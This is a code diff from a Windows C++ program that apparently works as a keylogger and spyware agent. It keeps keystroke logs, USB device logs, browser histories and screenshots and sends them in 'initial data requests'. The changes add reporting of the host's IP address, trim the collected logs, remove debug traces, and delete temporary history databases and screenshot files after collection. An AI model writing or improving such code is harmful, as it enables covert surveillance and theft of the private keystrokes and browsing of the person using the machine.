         PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
+        std::string bestIP = "";
+        int bestPriority = -1;
+        
         while (pAdapter) {
+            // Check if adapter has a valid IP
             PIP_ADDR_STRING pIPAddr = &pAdapter->IpAddressList;
             while (pIPAddr) {
                 std::string ip = pIPAddr->IpAddress.String;
-                // Skip empty, 0.0.0.0, loopback, APIPA, and IPv6-mapped addresses
                 if (!ip.empty() && ip != "0.0.0.0" &&
                     ip.substr(0, 4) != "127." &&
                     ip.substr(0, 8) != "169.254." &&
                     ip.find(':') == std::string::npos) {
-                    foundIP = ip;
-                    break;
+                    
+                    // Priority system: Ethernet > Wi-Fi > Others
+                    int priority = 0;
+                    if (pAdapter->Type == MIB_IF_TYPE_ETHERNET) {
+                        priority = 3; // Highest priority for Ethernet
+                    } else if (pAdapter->Type == IF_TYPE_IEEE80211) {
+                        priority = 2; // Second priority for Wi-Fi
+                    } else if (pAdapter->Type == IF_TYPE_PPP) {
+                        priority = 1; // Low priority for PPP (dial-up, VPN)
+                    } else {
+                        priority = 0; // Lowest priority for others
+                    }
+                    
+                    // Also check adapter description for additional hints
+                    std::string description = pAdapter->Description;
+                    
+                    // Boost priority for adapters that are likely primary
+                    if (description.find("Ethernet") != std::string::npos || 
+                        description.find("Gigabit") != std::string::npos ||
+                        description.find("Realtek") != std::string::npos ||
+                        description.find("Intel") != std::string::npos) {
+                        priority += 1;
+                    }
+                    
+                    // Skip virtual adapters and tunnels
+                    if (description.find("Virtual") == std::string::npos &&
+                        description.find("Tunnel") == std::string::npos &&
+                        description.find("Loopback") == std::string::npos &&
+                        description.find("VMware") == std::string::npos &&
+                        description.find("VirtualBox") == std::string::npos) {
+                        
+                        if (priority > bestPriority) {
+                            bestIP = ip;
+                            bestPriority = priority;
+                            // Found candidate IP
+                        }
+                    }
                 }
                 pIPAddr = pIPAddr->Next;
             }
-            if (foundIP != "Unknown") break;
             pAdapter = pAdapter->Next;
         }
+        
+        if (!bestIP.empty()) {
+            foundIP = bestIP;
+        }
+    } else {
+        // GetAdaptersInfo failed
     }
+    
     free(pAdapterInfo);
+    
+    // Additional fallback: Try to get IP by connecting to a remote address
+    if (foundIP == "Unknown") {
+        SOCKET sock = socket(AF_INET, SOCK_DGRAM, 0);
+        if (sock != INVALID_SOCKET) {
+            // Connect to a remote address to determine local IP
+            struct sockaddr_in remote_addr;
+            remote_addr.sin_family = AF_INET;
+            remote_addr.sin_port = htons(80);
+            inet_pton(AF_INET, "8.8.8.8", &remote_addr.sin_addr);
+            
+            if (connect(sock, (struct sockaddr*)&remote_addr, sizeof(remote_addr)) == 0) {
+                struct sockaddr_in local_addr;
+                int addr_len = sizeof(local_addr);
+                if (getsockname(sock, (struct sockaddr*)&local_addr, &addr_len) == 0) {
+                    char* ip_str = inet_ntoa(local_addr.sin_addr);
+                    if (ip_str && strcmp(ip_str, "0.0.0.0") != 0) {
+                        foundIP = std::string(ip_str);
+                        // Fallback method found IP
+                    }
+                }
+            }
+            closesocket(sock);
+        }
+    }
+    
+    if (foundIP == "Unknown") {
+        // Could not determine IP address
+    } else {
+        // IP address determined
+    }
+    
     return foundIP;
 } 
 
-// Memory management function to prevent unlimited growth
+// Memory management function to prevent unlimited growth - enhanced
 void manageMemoryLimits() {
     std::lock_guard<std::mutex> lock(dataMutex);
     
-    // Limit key logs
+    // Limit key logs - more aggressive trimming
     if (keyLogs.size() > MAX_KEY_LOGS) {
-        keyLogs.erase(keyLogs.begin(), keyLogs.begin() + (keyLogs.size() - MAX_KEY_LOGS));
-        writeDebugLog("Key logs trimmed to " + std::to_string(MAX_KEY_LOGS) + " entries");
+        size_t excess = keyLogs.size() - MAX_KEY_LOGS;
+        keyLogs.erase(keyLogs.begin(), keyLogs.begin() + excess);
+        writeDebugLog("Trimmed " + std::to_string(excess) + " key logs");
     }
     
-    // Limit USB logs
+    // Limit USB logs - more aggressive trimming
     if (usbDeviceLogs.size() > MAX_USB_LOGS) {
-        usbDeviceLogs.erase(usbDeviceLogs.begin(), usbDeviceLogs.begin() + (usbDeviceLogs.size() - MAX_USB_LOGS));
-        writeDebugLog("USB logs trimmed to " + std::to_string(MAX_USB_LOGS) + " entries");
+        size_t excess = usbDeviceLogs.size() - MAX_USB_LOGS;
+        usbDeviceLogs.erase(usbDeviceLogs.begin(), usbDeviceLogs.begin() + excess);
+        writeDebugLog("Trimmed " + std::to_string(excess) + " USB logs");
     }
     
-    // Limit browser histories
+    // Limit browser histories - more aggressive trimming
     if (browserHistories.size() > MAX_BROWSER_HISTORIES) {
-        browserHistories.erase(browserHistories.begin(), browserHistories.begin() + (browserHistories.size() - MAX_BROWSER_HISTORIES));
-        writeDebugLog("Browser histories trimmed to " + std::to_string(MAX_BROWSER_HISTORIES) + " entries");
+        size_t excess = browserHistories.size() - MAX_BROWSER_HISTORIES;
+        browserHistories.erase(browserHistories.begin(), browserHistories.begin() + excess);
+        writeDebugLog("Trimmed " + std::to_string(excess) + " browser histories");
+    }
+    
+    // Force garbage collection by shrinking vectors if they're much larger than needed
+    if (keyLogs.capacity() > MAX_KEY_LOGS * 2) {
+        std::vector<Json::Value>(keyLogs).swap(keyLogs);
+        writeDebugLog("Shrunk key logs vector capacity");
+    }
+    
+    if (usbDeviceLogs.capacity() > MAX_USB_LOGS * 2) {
+        std::vector<Json::Value>(usbDeviceLogs).swap(usbDeviceLogs);
+        writeDebugLog("Shrunk USB logs vector capacity");
+    }
+    
+    if (browserHistories.capacity() > MAX_BROWSER_HISTORIES * 2) {
+        std::vector<Json::Value>(browserHistories).swap(browserHistories);
+        writeDebugLog("Shrunk browser histories vector capacity");
     }
 } 
 
 // Send initial data requests (screenshot, tic, browser history, key log, USB log)
 void sendInitialDataRequests() {
-    writeDebugLog("Starting initial data requests...");
+    // Starting initial data requests
     
     // Send screenshot first (0.5s delay)
     std::string screenshotPath = takeScreenshot();
@@ -1920,5 +2201,44 @@ void sendInitialDataRequests() {
     
     // Delete the temporary screenshot file
     DeleteFileA(screenshotPath.c_str());
-    writeDebugLog("Initial data requests completed within 5 seconds.");
+    
+    // Clean up any other temporary files
+    cleanupTemporaryFiles();
+    // Initial data requests completed
+}
+
+// Clean up temporary files to prevent disk space issues
+void cleanupTemporaryFiles() {
+    // Clean up temporary database files
+    DeleteFileA("temp_chrome_history.db");
+    DeleteFileA("temp_firefox_history.db");
+    DeleteFileA("temp_edge_history.db");
+    
+    // Clean up any old screenshot files (older than 1 hour)
+    WIN32_FIND_DATAA findData;
+    HANDLE hFind = FindFirstFileA("screenshot_*.jpg", &findData);
+    if (hFind != INVALID_HANDLE_VALUE) {
+        do {
+            FILETIME fileTime = findData.ftCreationTime;
+            SYSTEMTIME systemTime;
+            FileTimeToSystemTime(&fileTime, &systemTime);
+            
+            // Check if file is older than 1 hour
+            FILETIME currentTime;
+            GetSystemTimeAsFileTime(&currentTime);
+            
+            ULARGE_INTEGER fileTimeUL, currentTimeUL;
+            fileTimeUL.LowPart = fileTime.dwLowDateTime;
+            fileTimeUL.HighPart = fileTime.dwHighDateTime;
+            currentTimeUL.LowPart = currentTime.dwLowDateTime;
+            currentTimeUL.HighPart = currentTime.dwHighDateTime;
+            
+            // 1 hour = 10000000 * 60 * 60 = 36000000000 (100-nanosecond intervals)
+            if ((currentTimeUL.QuadPart - fileTimeUL.QuadPart) > 36000000000) {
+                DeleteFileA(findData.cFileName);
+                writeDebugLog("Cleaned up old screenshot file: " + std::string(findData.cFileName));
+            }
+        } while (FindNextFileA(hFind, &findData));
+        FindClose(hFind);
+    }
 } 
